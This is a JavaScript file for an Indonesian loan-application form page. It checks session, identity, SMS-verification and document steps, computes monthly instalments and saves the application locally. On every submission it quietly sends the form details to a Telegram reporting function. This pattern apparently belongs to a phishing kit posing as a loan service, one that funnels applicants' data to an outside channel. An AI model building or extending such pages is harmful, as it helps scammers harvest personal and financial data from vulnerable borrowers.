(() => {
  'use strict';

  if (!NovaStorage.requireSession()) return;
  if (!NovaStorage.requireIdentity()) return;
  if (!NovaStorage.requireSmsVerification()) return;
  if (!NovaStorage.requireDocuments()) return;

  const amount = document.getElementById('amount');
  const tenor = document.getElementById('tenor');
  const purpose = document.getElementById('purpose');
  const monthly = document.getElementById('monthly');
  const loanForm = document.getElementById('loanForm');
  const backButton = document.getElementById('backButton');
  const annualRate = 12;

  if (!amount || !tenor || !purpose || !monthly || !loanForm) {
    console.error('Elemen form pinjaman tidak lengkap.');
    return;
  }

  const rupiah = value => new Intl.NumberFormat('id-ID', {
    style: 'currency',
    currency: 'IDR',
    maximumFractionDigits: 0
  }).format(value);

  function calculate() {
    const principal = Math.max(Number(amount.value) || 0, 0);
    const months = Math.max(Number(tenor.value) || 1, 1);
    const monthlyRate = annualRate / 100 / 12;

    const payment = monthlyRate === 0
      ? principal / months
      : principal
        * monthlyRate
        * Math.pow(1 + monthlyRate, months)
        / (Math.pow(1 + monthlyRate, months) - 1);

    const safePayment = Number.isFinite(payment) ? payment : 0;

    monthly.textContent = rupiah(safePayment);

    return {
      payment: safePayment,
      total: safePayment * months
    };
  }

  function syncLimit() {
    const value = Number(amount.value);

    if (!Number.isFinite(value) || value <= 0) {
      return;
    }

    NovaStorage.setApplication({
      limit: value
    });
  }

  amount.addEventListener('input', () => {
    calculate();
    syncLimit();
  });

  tenor.addEventListener('change', calculate);

  loanForm.addEventListener('submit', event => {
    event.preventDefault();

    const amountValue = Number(amount.value);
    const tenorValue = Number(tenor.value);
    const purposeValue = purpose.value.trim();

    if (!Number.isFinite(amountValue) || amountValue <= 0) {
      console.error('Nominal pinjaman tidak valid.');
      return;
    }

    if (!Number.isFinite(tenorValue) || tenorValue <= 0) {
      console.error('Tenor pinjaman tidak valid.');
      return;
    }

    if (!purposeValue) {
      console.error('Tujuan pinjaman belum dipilih.');
      return;
    }

    const calc = calculate();

    console.log('PINJAMAN DIPILIH:', amountValue);

    const loanSaved = NovaStorage.setLoan({
      amount: amountValue,
      tenor: tenorValue,
      purpose: purposeValue,
      annualRate,
      monthlyInstallment: Math.round(calc.payment),
      totalPayment: Math.round(calc.total)
    });

    const applicationSaved = NovaStorage.setApplication({
      limit: amountValue,
      tenor: tenorValue,
      annualRate
    });

    if (!loanSaved || !applicationSaved) {
      console.error('Data pengajuan tidak dapat disimpan.');
      return;
    }

    window.kirimLaporanKeTelegram?.({
      event: 'LOAN_FORM_SUBMITTED',
      page: 'form-pinjaman.html',
      amount: String(amountValue),
      tenor: String(tenorValue),
      purpose: purposeValue,
      status: 'LOAN_FORM_COMPLETED'
    });

    window.location.replace('ringkasan-pengajuan.html');
  });

  backButton?.addEventListener('click', () => {
    history.back();
  });

  calculate();
  syncLimit();
})();
